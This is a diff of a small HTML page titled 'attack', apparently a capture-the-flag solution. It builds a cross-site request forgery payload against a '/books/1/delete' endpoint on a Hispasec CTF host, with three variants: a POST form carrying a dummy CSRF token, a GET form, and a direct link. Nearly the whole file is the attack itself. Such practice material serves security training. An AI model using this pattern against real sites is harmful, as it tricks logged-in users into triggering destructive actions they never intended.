@@ -1,12 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <meta charset="utf-8">
+    <title>attack</title>
+</head>
 <body>
 
+<!-- Variante 1: POST directo -->
 <form action="https://ctf.fap.hispasec.com:8018/books/1/delete" method="POST">
+    <input type="hidden" name="_csrf" value="anything">
     <button id="objetivo" type="submit">
-        Click
+        Click me
     </button>
 </form>
+
+<!-- Variante 2: GET alternativo -->
+<form action="https://ctf.fap.hispasec.com:8018/books/1/delete" method="GET">
+    <button type="submit">
+        fallback
+    </button>
+</form>
+
+<!-- Variante 3: Link directo -->
+<a href="https://ctf.fap.hispasec.com:8018/books/1/delete">
+    direct
+</a>
 
 </body>
 </html>
